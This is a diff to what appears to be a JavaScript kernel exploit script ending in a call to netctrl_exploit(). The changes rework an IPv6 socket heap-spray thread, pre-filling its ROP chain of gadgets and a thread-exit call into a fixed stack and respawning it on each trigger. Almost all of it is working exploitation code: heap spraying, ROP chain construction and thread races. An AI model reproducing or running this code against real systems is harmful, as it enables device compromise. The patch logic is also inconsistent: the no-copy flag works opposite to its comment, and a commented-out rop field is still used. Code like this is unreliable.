@@ -251,7 +251,7 @@ var spray_ipv6_stack = malloc(0x2000);
 var spray_ipv6_triplet_ready = malloc(8);
 var spray_ipv6_triplet_done = malloc(8);
 var spray_ipv6_triplet_signal_buf = malloc(8);
-var spray_ipv6_triplet_stack = malloc(0x10000);
+var spray_ipv6_triplet_stack = malloc(0x7000);
 var store_socket_skip_0 = malloc(8);
 var store_socket_skip_1 = malloc(8);
 
@@ -504,10 +504,11 @@ function create_workers() {
     pipe_0 = read32(sock_buf);
     pipe_1 = read32(sock_buf.add(4));
 
-    ret = ipv6_sock_spray_triplet_rop(ready, pipe_0, done, signal_buf);
+    ipv6_sock_spray_triplet_rop(ready, pipe_0, done, signal_buf);
 
-    worker.rop = ret.rop;
-    worker.loop_size = ret.loop_size;
+    // This stack is already filled in
+    //worker.rop = ret.rop;
+    //worker.loop_size = ret.loop_size;
     worker.pipe_0 = pipe_0;
     worker.pipe_1 = pipe_1;
     worker.ready = ready;
@@ -555,13 +556,6 @@ function init_workers() {
         var thread_id = ret & 0xFFFFFFFF;               // Convert to 32bits value
         uio_writev_workers[i].thread_id = thread_id;    // Save thread ID
     }
-
-    ret = spawn_thread(spray_ipv6_triplet_worker.rop, spray_ipv6_triplet_worker.loop_size, spray_ipv6_triplet_stack);
-    if (ret.eq(BigInt_Error)) {
-        throw new Error("Could not spawn spray_ipv6_triplet_worker");
-    }
-    var thread_id = ret & 0xFFFFFFFF;               // Convert to 32bits value
-    spray_ipv6_triplet_worker.thread_id = thread_id;    // Save thread ID
 }
 
 function nanosleep_fun(nsec) {
@@ -578,7 +572,18 @@ function wait_for(addr, threshold) {
 }
 
 function trigger_triplet_spray() {
+    debug("Trigger Triplet Stray");
     worker = spray_ipv6_triplet_worker;
+
+    // Spawn a new spray
+    var ret = spawn_thread(worker.rop, worker.loop_size, spray_ipv6_triplet_stack, true);
+    
+    if (ret.eq(BigInt_Error)) {
+        throw new Error("Could not spawn spray_ipv6_triplet_worker");
+    }
+    var thread_id = ret & 0xFFFFFFFF;                   // Convert to 32bits value
+    spray_ipv6_triplet_worker.thread_id = thread_id;    // Save thread ID
+
     write64(worker.done, 0);
     ret = write(worker.pipe_1, worker.signal_buf, 1); 
     if (ret.eq(BigInt_Error)) {
@@ -1847,24 +1852,27 @@ function rop_regen_and_loop(last_rop_entry, number_entries) {
     write64(new_rop_entry.add(0x8),  rop_loop);
 }
 
-function spawn_thread(rop_array, loop_entries, stack) {
+function spawn_thread(rop_array, loop_entries, stack, flag_no_copy) {
     
     var rop_addr = stack !== undefined ? stack : malloc(0x600);
 
     //const rop_addr = malloc(size); // ROP Stack plus extra size
 
-    // Fill ROP Stack
-    for(var i=0 ; i < rop_array.length ; i++) {
-        write64(rop_addr.add(i*8), rop_array[i]);
-        //debug("This is what I wrote: " + hex(read64(rop_race1_addr.add(i*8))));
-    }
+    // Fill ROP Stack if we need to
+    // Triplet ROP has already the stack filled
+    if (flag_no_copy !== undefined) {
+        for (var i=0 ; i < rop_array.length ; i++) {
+            write64(rop_addr.add(i*8), rop_array[i]);
+            //debug("This is what I wrote: " + hex(read64(rop_race1_addr.add(i*8))));
+        }
 
-    // if loop_entries <> 0 we need to prepare the ROP to regenerate itself and jump back
-    // loop_entries indicates the number of stack entries we need to regenerate
-    if (loop_entries !== 0) {
-        var last_rop_entry = rop_addr.add(rop_array.length * 8).sub(8); // We pass the add of the last ROP instruction
-        rop_regen_and_loop(last_rop_entry, loop_entries);
-        // now our rop size is rop_array.length + loop_entries * (0x28) {copy primitive} + 0x10 {stack pivot}
+        // if loop_entries <> 0 we need to prepare the ROP to regenerate itself and jump back
+        // loop_entries indicates the number of stack entries we need to regenerate
+        if (loop_entries !== 0) {
+            var last_rop_entry = rop_addr.add(rop_array.length * 8).sub(8); // We pass the add of the last ROP instruction
+            rop_regen_and_loop(last_rop_entry, loop_entries);
+            // now our rop size is rop_array.length + loop_entries * (0x28) {copy primitive} + 0x10 {stack pivot}
+        }
     }
 
     const jmpbuf = malloc(0x60);
@@ -2371,13 +2379,18 @@ function ipv6_sock_spray_triplet_rop (ready_signal, run_fd, done_signal, signal_
     var loop_end = rop.length;
     var loop_size = loop_end - loop_init;
 
-    // It's gonna loop
+    // Exit
+    rop.push(gadgets.POP_RDI_RET)
+    rop.push(0)
+    rop.push(thr_exit_wrapper)
 
-    return {
-        rop: rop,
-        loop_size: loop_size
+    // Fill the stack here, not every time the thread is created
+    debug("Filling stack triplet of size: " + rop.length);
+    for(var i=0 ; i < rop.length ; i++) {
+        write64(spray_ipv6_triplet_stack.add(i*8), rop[i]);
     }
-
+    debug("Filling done");
+    return
 }
 
 netctrl_exploit();
